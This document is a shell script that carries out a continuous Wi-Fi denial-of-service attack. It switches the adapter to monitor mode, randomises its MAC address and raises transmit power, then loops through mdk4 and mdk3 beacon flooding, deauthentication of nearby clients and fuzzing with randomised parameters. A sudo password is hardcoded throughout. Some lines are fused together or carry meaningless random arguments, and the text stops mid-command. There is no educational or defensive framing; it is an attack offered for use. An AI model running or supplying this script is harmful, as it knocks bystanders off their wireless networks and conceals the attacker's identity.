#!/bin/sh 
	echo parol | sudo -S rfkill unblock 0
	echo parol | sudo -S rfkill unblock 1
	echo parol | sudo -S rfkill unblock 2
	echo parol | sudo -S rfkill unblock 3
	echo parol | sudo -S rfkill unblock 4
	echo parol | sudo -S rfkill unblock 5
	echo parol | sudo -S rfkill unblock 6
	echo parol | sudo -S rfkill unblock 7
	echo parol | sudo -S rfkill unblock 8
	echo parol | sudo -S rfkill unblock 9
	echo parol | sudo -S rfkill unblock 10
	echo parol | sudo -S rfkill unblock 11
	echo parol | sudo -S rfkill unblock 12
	echo parol | sudo -S rfkill unblock 13
	echo parol | sudo -S iw reg set US
	echo parol | sudo -S airmon-ng check kill
	echo parol | sudo -S ip link set wlan0 down
	echo parol | sudo -S macchanger -r wlan0
	echo parol | sudo -S iw dev wlan0 set type monitor
	echo parol | sudo -S iw dev wlan0 set txpower fixed 30mBm
	echo parol | sudo -S iw dev wlan0 set txpower fixed 30mBm
	
	echo parol | sudo -S rfkill unblock 0
	echo parol | sudo -S rfkill unblock 1
	echo parol | sudo -S rfkill unblock 2
	echo parol | sudo -S rfkill unblock 3
	echo parol | sudo -S rfkill unblock 4
	echo parol | sudo -S rfkill unblock 5
	echo parol | sudo -S rfkill unblock 6
	echo parol | sudo -S rfkill unblock 7
	echo parol | sudo -S rfkill unblock 8
	echo parol | sudo -S rfkill unblock 9
	echo parol | sudo -S rfkill unblock 10
	echo parol | sudo -S rfkill unblock 11
	echo parol | sudo -S rfkill unblock 12
	echo parol | sudo -S rfkill unblock 13
	clear
	while :
	do
		while :
		do
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			 
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			
			
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear 
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
						echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
						echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
						echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear

			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
						echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 1234567' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			 
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 23425' & sleep 5 && clear 
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clearecho parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			 
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			 
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			 echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

						 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			 
			 echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -c $(echo $(LC_ALL=C tr -dc 1 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-8 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
						echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -c $(echo $(LC_ALL=C tr -dc 2-9 </dev/urandom | head -c 1))$(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 1)) -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear

echo parol | sudo -S   sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear

			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
echo parol | sudo -S mdk4 wlan0 f -s c -m m $(echo $((15 + $RANDOM % 15))):$(echo $((15 + $RANDOM % 15))):$(echo $((29 + $RANDOM % 29))):$(echo $((39 + $RANDOM % 39))):$(echo $((49 + $RANDOM % 49))) -c $(echo $((93 + $RANDOM % 93))):$(echo $((9300000 + $RANDOM % 9300000))) -p $(echo $((125000000 + $RANDOM % 125000000))) & echo $(echo $((125000000 + $RANDOM % 125000000))) & echo parol | sudo -S mdk4 wlan0 f -s c -m m $(echo $((15 + $RANDOM % 15))):$(echo $((15 + $RANDOM % 15))):$(echo $((29 + $RANDOM % 29))):$(echo $((39 + $RANDOM % 39))):$(echo $((49 + $RANDOM % 49))) -c $(echo $((93 + $RANDOM % 93))):$(echo $((9300000 + $RANDOM % 9300000))) -p $(echo $((125000000 + $RANDOM % 125000000))) & echo $(echo $((125000000 + $RANDOM % 125000000))) & echo parol | sudo -S mdk4 wlan0 f -s c -m m $(echo $((15 + $RANDOM % 15))):$(echo $((15 + $RANDOM % 15))):$(echo $((29 + $RANDOM % 29))):$(echo $((39 + $RANDOM % 39))):$(echo $((49 + $RANDOM % 49))) -c $(echo $((93 + $RANDOM % 93))):$(echo $((9300000 + $RANDOM % 9300000))) -p $(echo $((125000000 + $RANDOM % 125000000))) & echo $(echo $((125000000 + $RANDOM % 125000000))) & echo parol | sudo -S mdk4 wlan0 f -s c -m m $(echo $((15 + $RANDOM % 15))):$(echo $((15 + $RANDOM % 15))):$(echo $((29 + $RANDOM % 29))):$(echo $((39 + $RANDOM % 39))):$(echo $((49 + $RANDOM % 49))) -c $(echo $((93 + $RANDOM % 93))):$(echo $((9300000 + 